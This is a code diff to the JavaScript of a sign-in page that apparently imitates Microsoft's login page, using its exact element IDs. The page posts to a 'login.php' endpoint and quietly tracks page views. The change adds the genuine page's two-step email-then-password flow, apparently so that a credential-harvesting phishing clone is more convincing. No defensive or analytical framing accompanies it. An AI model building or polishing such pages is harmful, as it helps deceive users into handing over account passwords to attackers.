@@ -1,59 +1,63 @@
 document.addEventListener('DOMContentLoaded', function() {
-    // Get form elements
     const form = document.getElementById('i0281');
     const emailInput = document.getElementById('i0116');
     const passwordInput = document.getElementById('i0118');
     const submitButton = document.getElementById('idSIButton9');
+    const loginHeader = document.getElementById('loginHeader');
+    const emailRow = emailInput.closest('.row');
+    const passwordRow = passwordInput.closest('.row');
 
-    // Focus on email input when page loads
+    passwordRow.style.display = 'none';
+
     emailInput.focus();
 
-    // Add event listeners
     emailInput.addEventListener('keypress', function(e) {
         if (e.key === 'Enter') {
             e.preventDefault();
-            passwordInput.focus();
+            showPasswordField();
         }
     });
 
     form.addEventListener('submit', function(e) {
-        // Perform basic validation
-        if (!emailInput.value.trim()) {
+        if (passwordRow.style.display === 'none') {
             e.preventDefault();
-            emailInput.focus();
-            return false;
-        }
+            showPasswordField();
+        } else {
+            if (!passwordInput.value.trim()) {
+                e.preventDefault();
+                passwordInput.focus();
+                return false;
+            }
 
-        if (!passwordInput.value.trim()) {
-            e.preventDefault();
-            passwordInput.focus();
-            return false;
+            submitButton.value = "Signing in...";
+            submitButton.disabled = true;
         }
-
-        // Submit form to login.php endpoint
-        // No need to prevent default as we want the form to actually submit
-        submitButton.value = "Signing in...";
-        submitButton.disabled = true;
     });
 
-    // Track login attempts for analytics (sends to our backend)
+    function showPasswordField() {
+        const emailValue = emailInput.value.trim();
+        if (!emailValue) {
+            emailInput.focus();
+            return;
+        }
+
+        emailRow.style.display = 'none';
+        passwordRow.style.display = 'block';
+        passwordInput.focus();
+        loginHeader.querySelector('div').innerText = emailValue;
+    }
+
+    // Tracking login page load
     function trackLoginAttempt() {
-        // Create a tracking fetch request
         fetch('/api/track', {
             method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
+            headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 type: 'login_view',
                 timestamp: new Date().toISOString()
             })
-        }).catch(err => {
-            // Silently fail - don't alert user to tracking
-            console.error(err);
-        });
+        }).catch(err => console.error(err));
     }
 
-    // Track page load
     trackLoginAttempt();
 });
